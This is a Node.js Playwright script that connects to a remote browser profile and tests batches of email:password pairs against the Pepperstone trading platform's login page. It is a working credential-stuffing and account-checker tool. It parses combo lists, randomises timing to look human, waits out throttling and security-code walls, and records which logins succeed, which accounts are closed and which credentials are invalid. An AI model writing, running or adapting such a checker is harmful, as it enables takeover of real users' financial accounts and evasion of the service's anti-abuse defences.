#!/usr/bin/env node
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';
const CDP = 'wss://clk.mrme.tech/api/profiles/3f57ea63-9857-41ef-95f5-2a1369009dbb/cdp';
const TOKEN = 'change-me-to-a-secure-token';
const URL = 'https://auth.pepperstone.com/login';
const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function waitForForm(page) {
  for (let i = 0; i < 30; i++) {
    const ready = await page.evaluate(() => !!document.querySelector('#field1, input[type=email]')).catch(() => false);
    if (ready) { await sleep(1200); return true; }
    await sleep(2000);
  }
  return false;
}

async function tryLogin(browser, u, p) {
  const ctx = browser.contexts()[0];
  const page = await ctx.newPage();
  try {
    await ctx.clearCookies();
    await page.goto('about:blank', { timeout: 10000 }).catch(() => {});
    await page.evaluate(() => { try { localStorage.clear(); } catch {}
      try { sessionStorage.clear(); } catch {} }).catch(() => {});
    await page.goto(URL, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
    if (!(await waitForForm(page))) {
      const body = await page.evaluate(() => document.body.innerText.replace(/\s+/g, ' ').slice(0, 60)).catch(() => '');
      return { status: 'PAGE_FAIL', detail: page.url().slice(0, 60) + ' | ' + body };
    }
    await page.fill('#field1', u);
    await sleep(rand(300, 800));
    await page.fill('#field4', p);
    await sleep(rand(500, 1000));
    await page.evaluate(() => { const b = [...document.querySelectorAll('form button')].find(b => b.type === 'submit'); if (b) b.click(); });
    await sleep(rand(9000, 11000));
    const st = await page.evaluate(() => ({
      url: location.href.slice(0, 120),
      alerts: [...document.querySelectorAll('[class*=error], [role=alert], [class*=message]')].map(e => e.innerText.trim().replace(/\s+/g, ' ')).filter(Boolean).slice(0, 5),
      body: document.body.innerText.replace(/\s+/g, ' ').slice(0, 250),
    })).catch(() => ({ url: page.url(), alerts: [], body: '' }));
    return classify(st);
  } finally { await page.close().catch(() => {}); }
}

function classify(o) {
  const t = (o.alerts && o.alerts.join(' ')) + ' ' + o.body;
  const url = o.url;
  if (/login was not successful|invalid (email|username|password)|wrong (email|password)/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 90) };
  if (/security code/i.test(t)) return { status: 'SECURITY_CODE', detail: t.slice(0, 90) };
  if (/locked|too many (failed )?(login )?attempts|temporarily (blocked|disabled)|security reasons/i.test(t)) return { status: 'THROTTLED', detail: t.slice(0, 90) };
  if (/no longer (available|active)|account (has been )?closed|inactive account|closed account/i.test(t)) return { status: 'CLOSED', detail: t.slice(0, 90) };
  if (/^https:\/\/secure\.pepperstone\.com/.test(url) && !/login/.test(url) || /code=/.test(url)) return { status: 'SUCCESS', detail: 'redirected ' + url.slice(0, 80) };
  if (/^https:\/\//.test(url) && !/auth\.pepperstone\.com/.test(url)) return { status: 'SUCCESS', detail: 'redirected ' + url.slice(0, 80) };
  return { status: 'UNKNOWN', detail: t.slice(0, 130) };
}

function parsePair(line) {
  line = line.trim(); if (!line) return null;
  const parts = line.split(':');
  if (parts.length < 2) return null;
  if (/^[a-z0-9.-]+(\:\d+)?(\/.*)?$/.test(parts[0]) && parts[0].includes('.') && !parts[0].includes('@')) {
    if (parts.length < 3) return null; return [parts[1], parts.slice(2).join(':')];
  }
  return [parts[0], parts.slice(1).join(':')];
}

const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node pepperstone_login.mjs "email:pass" | --batch <file>'); process.exit(1); }
const gapIdx = args.indexOf('--gap');
const GAP = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 30 : 30;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/ps_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, SUCCESS: 1, CLOSED: 1 };

let browser = null;
for (const [u, p] of pairs) {
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  let res;
  try {
    if (!browser) browser = await chromium.connectOverCDP(CDP, { timeout: 20000, headers: { Authorization: 'Bearer ' + TOKEN } });
    res = await tryLogin(browser, u, p);
    console.log(`${u} -> ${res.status} (${res.detail})`);
    if (res.status === 'THROTTLED' || res.status === 'SECURITY_CODE') { console.log('throttle/wall; pausing 600s...'); await sleep(600000); }
  } catch (e) {
    console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
    res = { status: 'ERROR', detail: e.message.slice(0, 150) };
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (pairs.length > 1) { const gap = rand(GAP * 0.5, GAP * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
if (browser) await browser.close().catch(() => {});
console.log('results saved to ' + OUT);
